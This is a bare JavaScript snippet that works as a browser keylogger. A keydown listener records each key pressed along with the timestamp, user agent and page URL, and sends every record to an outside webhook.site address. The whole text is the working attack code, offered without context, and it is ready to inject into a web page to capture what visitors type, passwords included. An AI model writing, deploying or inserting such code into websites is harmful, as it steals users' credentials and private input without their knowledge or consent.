document.addEventListener("keydown", function(event){
    const payload = {
        key: event.key,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        url: window.location.href
    };
    
    fetch("https://webhook.site/abc123", {
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
});
